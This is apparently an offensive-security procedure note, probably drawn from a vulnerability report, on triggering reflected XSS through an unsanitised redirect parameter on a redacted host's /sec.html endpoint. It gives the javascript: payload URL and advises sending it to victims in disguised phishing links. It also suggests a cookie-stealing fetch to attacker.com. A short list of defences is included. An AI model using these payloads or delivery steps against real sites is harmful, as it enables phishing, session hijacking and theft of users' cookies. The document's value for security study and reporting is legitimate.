---
tags:
  - xss
  - reflected-xss
  - execution
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2024-01-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:52:24.711Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
id: 99d572d0-17b4-4cfe-9d34-9a3720d0a0c3
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Trigger-Reflected-XSS-via-Malicious-Redirect-URL

## Summary

This procedure delivers and triggers a reflected XSS payload by having a victim access a specially crafted URL, resulting in arbitrary JavaScript execution due to unsanitized assignment to window.location.href.

## Description

Once the malicious redirect URL is crafted, it is sent to the victim (e.g., via phishing link). Upon access, the /sec.html endpoint processes the redirect parameter without sanitization, directly setting window.location.href to the javascript: payload. This executes the embedded JavaScript in the browser, such as alerting cookies or performing redirects/phishing. In a DoD context, this can lead to session hijacking or data exfiltration from authenticated users.

## Requirements

1. Crafted malicious URL from prior procedure
2. Victim interaction (e.g., clickable link)
3. Browser with JavaScript enabled

## Defense

Defensive measures and detection strategies:

- Whitelist allowed redirect domains and protocols server-side
- Escape or reject javascript: and data: schemes in redirects
- Implement HTTP-only cookies and SameSite=Strict to mitigate session theft
- Log and alert on suspicious redirect parameters containing unusual schemes

## Objectives

1. Cause victim browser to execute injected JavaScript
2. Achieve impacts like cookie theft or unwanted actions
3. Demonstrate vulnerability for reporting

## Instructions

### Step 1: Deliver the URL

**Context**: Send the malicious URL to the target victim to initiate the attack.

Embed the URL `https://█████████/sec.html?redirect=javascript:alert(document.cookie);//://████/` in an email, message, or webpage link disguised as legitimate (e.g., "Click here for secure login").

### Step 2: Victim Accesses the URL

**Context**: When clicked, the endpoint loads and processes the redirect.

The browser navigates to /sec.html, which calls isSafeHost (bypassed) and sets window.location.href = rawRedirect, executing the javascript:alert(document.cookie) immediately.

### Step 3: Observe Execution

**Context**: Verify JS runs in the victim's session context.

Look for the alert popup displaying cookies, or enhance payload to send data to attacker-controlled server (e.g., javascript:fetch('https://attacker.com?cookie='+document.cookie)).

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[reflected-xss]]
- [[Execution]]
